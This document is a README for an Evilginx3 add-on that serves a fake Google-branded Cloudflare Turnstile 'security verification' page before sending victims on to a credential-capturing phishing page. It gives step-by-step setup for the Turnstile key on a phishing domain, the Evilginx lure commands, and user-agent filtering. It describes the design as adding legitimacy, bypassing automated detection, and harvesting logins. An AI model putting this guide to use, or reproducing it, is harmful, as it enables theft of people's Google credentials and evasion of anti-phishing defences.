# Google Turnstile Redirector

This redirector provides a Cloudflare Turnstile verification page styled to match Google's branding before redirecting users to the phishing landing page.

## What It Does

When a user visits your lure URL, they will first see a Google-branded security verification page. After Cloudflare Turnstile verifies they're human (invisible mode), they are automatically redirected to the actual phishing login page. This adds an extra layer of legitimacy and helps bypass automated detection.

## Setup Instructions

### Step 1: Create Cloudflare Turnstile Site

1. Go to [Cloudflare Turnstile Dashboard](https://dash.cloudflare.com/?to=/:account/turnstile)
2. Click **"Add Site"**
3. Configure the site:
   - **Site Name**: Give it a descriptive name (e.g., "Google Phishing")
   - **Domain**: Enter your phishing domain (e.g., `accounts.your-phishing-domain.com`)
   - **Widget Mode**: Select **"Invisible"** for seamless user experience
4. Click **"Create"**
5. **Copy the Site Key** - you'll need this in the next step

### Step 2: Configure the Redirector

1. Open `index.html` in a text editor
2. Find the line with `TURNSTILE_SITEKEY` (around line 209)
3. Replace `'YOUR_TURNSTILE_SITE_KEY'` with your actual Site Key from Cloudflare
   ```javascript
   const TURNSTILE_SITEKEY = '0x4AAAAAAB_V5zjG-p6Hl2ZQ'; // Your actual key here
   ```
4. Save the file

### Step 3: Create a Lure

1. Start Evilginx3 and create a lure for the Google phishlet:
   ```
   lures create google
   ```
   This will create a lure with a random path (e.g., `/LsPqzdYP`)

2. View your lures to get the lure ID:
   ```
   lures
   ```
   Note the ID number (e.g., `0`, `1`, `2`, etc.)

### Step 4: Assign the Redirector to Your Lure

Set the redirector for your lure using the lure ID:
```
lures edit <id> redirector google_turnstile
```

**Example:**
```
lures edit 0 redirector google_turnstile
```

### Step 5: Get Your Lure URL

Get the full phishing URL:
```
lures get-url <id>
```

**Example:**
```
lures get-url 0
```

This will output something like:
```
https://accounts.your-phishing-domain.com/LsPqzdYP
```

## How It Works

1. **User visits lure URL** → They see the Google-branded security verification page
2. **Turnstile verifies** → Cloudflare's invisible Turnstile checks if the user is human
3. **Automatic redirect** → After verification (or 3-second timeout), user is redirected to `/` where the actual Google phishing page is served
4. **User logs in** → Credentials are captured by Evilginx3

## Features

- ✅ Google-branded security verification page
- ✅ Invisible Cloudflare Turnstile integration (no visible CAPTCHA)
- ✅ Automatic redirect after verification (3-second fallback)
- ✅ Mobile-responsive design
- ✅ Matches Google's visual identity
- ✅ Fallback redirect if Turnstile fails to load

## Troubleshooting

### Redirector Not Showing
- Verify the redirector is set: `lures` (check the redirector column)
- Ensure the redirector directory exists: `redirectors/google_turnstile/`
- Check that `index.html` exists in the directory

### Turnstile Not Working
- Verify your Site Key is correctly set in `index.html`
- Check that your domain matches the one configured in Cloudflare Turnstile
- Ensure Widget Mode is set to "Invisible" in Cloudflare dashboard
- Check browser console for errors (F12 → Console)

### Redirect Loop
- The redirector redirects to `/` (root path) where the phishing page should be served
- Ensure your phishlet is properly configured and enabled
- Check that the lure path is set correctly

## Additional Configuration

### Custom Redirect URL
If you want the redirector to redirect to a specific path instead of `/`:
```
lures edit <id> redirect_url https://accounts.your-phishing-domain.com/custom-path
```

### User-Agent Filtering
Filter users by User-Agent:
```
lures edit <id> ua_filter ".*Mobile.*"
```

### Pause/Unpause Lure
Temporarily disable a lure:
```
lures pause <id>
```

Re-enable it:
```
lures unpause <id>
```

## Files in This Directory

- `index.html` - Main redirector page with Turnstile integration
- `README.md` - This documentation file
- `robots.txt` - Prevents search engine indexing
- `default.html` - Empty fallback file

## Notes

- The redirector redirects to the root path (`/`) where the Google phishing page is served
- If Turnstile fails to load or verify, the page will redirect anyway after a 3-second timeout
- The page includes a manual "Continue to Google" button as a fallback
- All redirects happen client-side (JavaScript) for better stealth
